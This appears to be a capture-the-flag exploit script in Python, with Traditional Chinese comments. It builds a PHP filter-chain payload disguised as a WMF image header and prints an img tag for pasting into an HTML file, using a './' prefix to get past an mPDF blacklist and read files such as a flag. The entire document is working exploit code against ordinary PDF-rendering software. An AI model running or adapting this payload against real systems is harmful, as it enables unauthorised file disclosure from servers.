import base64
from php_filter_chain_generator import generate_filter_chain

print("[*] 正在生成 WMF 圖片偽裝的 PHP Filter Chain Payload...")

# 1. 構建 WMF 圖片標頭 (利用前人研究出的向量圖形偽裝術)
n_points = 20 # 這個點數足夠容納一般的 Flag 長度
sz = (n_points * 2 + 6).to_bytes(4, byteorder='little')
n = (n_points).to_bytes(2, byteorder='little')

pay = (
    b"\xd7\xcd\xc6\x9a" +                         # WMF Magic Bytes
    (b"A" * 36) +                                 # Padding
    b"\x05\x00\x00\x00\x0b\x02\x7f\x7f\x7f\x7f" + # Set canvas origin
    b"\x05\x00\x00\x00\x0c\x02\x7f\x7f\x7f\x7f" + # Set canvas size
    sz +                                          # Size of PolyPolygon
    b"\x38\x05" +                                 # PolyPolygon Func
    b"\x01\x00" +                                 # 1 polygon
    n +                                           # N points
    b"AA"                                         # Padding
)

# 2. 將 WMF 標頭轉成 Base64
rawbase64 = base64.b64encode(pay).decode('ascii').replace("=", "")

# 3. 呼叫工具產生 Filter Chain 字串
chain = generate_filter_chain(rawbase64)

# 4. 組合最終的 img 標籤 (加上 ./ 繞過 mPDF 黑名單)
final_img_tag = f'<img src="./{chain}">'

print("\n[+] 產生成功！請將下面這一整行 <img ...> 複製，貼到你的 index.html 中：\n")
print(final_img_tag)
